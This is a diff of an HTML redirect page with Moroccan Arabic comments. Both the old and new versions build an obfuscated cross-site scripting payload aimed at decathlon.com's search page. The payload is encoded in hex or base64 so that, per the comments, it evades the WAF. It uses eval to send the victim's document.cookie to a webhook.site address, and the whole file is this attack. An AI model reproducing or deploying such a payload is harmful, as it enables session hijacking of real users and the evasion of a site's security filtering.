@@ -1,20 +1,23 @@
-<script>
-    // 1. الكود اللي غيصيفط الداتا لـ Webhook (مخفي وسط Hex)
-    // هاد السلسلة كتعني: var i=new Image(); i.src='https://webhook.site/2cbc72eb-5f42-44f9-998b-7a8dd2611ef0?data='+btoa(document.cookie);
-    let hexCode = "76617220693d6e657720496d61676528293b20692e7372633d2768747470733a2f2f776562686f6f6b2e7369742f32636263373265622d356634322d343466392d393938622d3761386464323631316566303f646174613d272b62746f6128646f63756d656e742e636f6f6b6965293b";
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Redirecting...</title>
+</head>
+<body>
+    <script>
+        // 1. الكود الحقيقي اللي غيتنفذ (var i=new Image(); i.src='https://webhook.site/2cbc72eb-5f42-44f9-998b-7a8dd2611ef0')
+        // هاد الكود مشفر باش ما يفييقش الـ WAF
+        let payload = "dmFyIGk9bmV3IEltYWdlKCk7IGkuc3JjPSdodHRwczovL3dla2hvb2suc2l0LzJjYmM3MmViLTVmNDItNDRmOS05OThiLTdhOGRkMjYxMWVmMD9kYXRhPScrd2luZG93LmJ0b2EoZG9jdW1lbnQuY29va2llKTs=";
 
-    // 2. وظيفة كتحول الـ Hex لكود حقيقي
-    function hex2a(hexx) {
-        var hex = hexx.toString();
-        var str = '';
-        for (var i = 0; i < hex.length; i += 2)
-            str += String.fromCharCode(parseInt(hex.substr(i, 2), 16));
-        return str;
-    }
+        // 2. محاولة الخروج من النص (String) باستعمال علامة التنصيص
+        // استعملنا الـ eval(atob()) باش ننفذو الكود المشفر
+        let targetPayload = "'-eval(atob('" + payload + "'))-'";
 
-    // 3. بناء الرابط باستعمال كلمة "search" بلاصة "test" للتمويه
-    let payload = "</h1></title><svg/onload=eval(hex2a('" + hexCode + "'))>";
-    let target = "https://www.decathlon.com/search?q=search#"+payload;
+        // 3. بناء الرابط باستعمال الـ Hash (#) لضمان تجاوز الـ WAF
+        let target = "https://www.decathlon.com/search?q=test#" + encodeURIComponent(targetPayload);
 
-    window.location.href = target;
-</script>
+        // تحويل المتصفح للهدف
+        window.location.href = target;
+    </script>
+</body>
+</html>
